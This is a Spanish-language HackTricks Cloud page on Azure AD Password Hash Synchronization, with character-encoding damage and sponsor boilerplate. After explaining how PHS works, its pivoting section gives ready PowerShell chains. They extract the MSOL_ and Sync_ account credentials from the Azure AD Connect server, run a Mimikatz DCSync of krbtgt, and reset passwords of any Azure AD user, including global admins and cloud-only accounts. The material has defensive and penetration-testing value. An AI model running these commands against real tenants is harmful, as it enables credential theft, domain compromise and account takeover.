# PHS - Sincronizaci√≥n de Hash de Contrase√±a

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## Informaci√≥n B√°sica

La **sincronizaci√≥n de hash de contrase√±a** es uno de los m√©todos de inicio de sesi√≥n utilizados para lograr la identidad h√≠brida. Azure AD Connect sincroniza un hash, del hash, de la contrase√±a de un usuario desde una instancia de Active Directory local a una instancia de Azure AD basada en la nube.

<figure><img src="../../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

Es el m√©todo **m√°s com√∫n** utilizado por las empresas para sincronizar un AD local con Azure AD.

Todos los **usuarios** y un **hash de los hashes de las contrase√±as** se sincronizan desde el local a Azure AD. Sin embargo, las **contrase√±as en texto claro** o los **hashes originales** no se env√≠an a Azure AD.\
Adem√°s, los grupos de seguridad **integrados** (como los administradores de dominio...) no se sincronizan con Azure AD.

La **sincronizaci√≥n de hashes** ocurre cada **2 minutos**. Sin embargo, de forma predeterminada, la **caducidad de la contrase√±a** y la **caducidad de la cuenta** no se sincronizan en Azure AD. Por lo tanto, un usuario cuya **contrase√±a local ha caducado** (no cambiada) puede seguir **accediendo a los recursos de Azure** utilizando la contrase√±a antigua.

Cuando un usuario local quiere acceder a un recurso de Azure, la **autenticaci√≥n se realiza en Azure AD**.

**PHS** es necesario para funciones como **Identity Protection** y AAD Domain Services.

## Pivoteo

Cuando se configura PHS, algunos **cuentas privilegiadas** se crean autom√°ticamente:

* La cuenta **`MSOL_<installationID>`** se crea autom√°ticamente en el AD local. A esta cuenta se le otorga un rol de **Cuentas de Sincronizaci√≥n de Directorio** (ver [documentaci√≥n](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)) lo que significa que tiene **permisos de replicaci√≥n (DCSync) en el AD local**.
* Se crea una cuenta **`Sync_<nombre del servidor ADConnect local>_installationID`** en Azure AD. Esta cuenta puede **restablecer la contrase√±a de CUALQUIER usuario** (sincronizado o solo en la nube) en Azure AD.

Las contrase√±as de las dos cuentas privilegiadas anteriores se **almacenan en un servidor SQL** en el servidor donde se **instala Azure AD Connect.** Los administradores pueden extraer las contrase√±as de esos usuarios privilegiados en texto claro.

Si el **servidor donde se instala Azure AD Connect** est√° unido al dominio (recomendado en la documentaci√≥n), es posible encontrarlo con:

```powershell
# M√≥dulo ActiveDirectory
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

# M√≥dulo Azure AD
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```

### AzureAD -> Local

```powershell
# Una vez que se ha comprometido el servidor de Azure AD Connect, se pueden extraer credenciales con el m√≥dulo AADInternals
Get-AADIntSyncCredentials

# Usando las credenciales de la cuenta MSOL_*, se puede ejecutar DCSync contra el AD local
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```

### Local -> AzureAD

Comprometiendo la cuenta `Sync_*` es posible **restablecer la contrase√±a** de cualquier usuario (incluidos los administradores globales)

```powershell
# Este comando, ejecutado previamente, tambi√©n nos dar√° las credenciales de esta cuenta
Get-AADIntSyncCredentials

# Obtener token de acceso para la cuenta Sync_*
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Obtener administradores globales
Get-AADIntGlobalAdmins

# Obtener el ImmutableId de un usuario local en Azure AD (este es el identificador √∫nico derivado del GUID local)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Restablecer la contrase√±a del usuario
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Ahora es posible acceder a Azure AD con la nueva contrase√±a y al local con la antigua (los cambios de contrase√±a no se sincronizan)
```

Tambi√©n es posible **modificar las contrase√±as de los usuarios solo en la nube** (aunque esto no es lo esperado)

```powershell
# Para restablecer la contrase√±a de un usuario solo en la nube, necesitamos su CloudAnchor que se puede calcular a partir de su cloud objectID
# El CloudAnchor tiene el formato USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Restablecer la contrase√±a
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```

### Seamless SSO

Es posible utilizar Seamless SSO con PTA, lo que es vulnerable a otros abusos. Compru√©balo en:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## Referencias

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https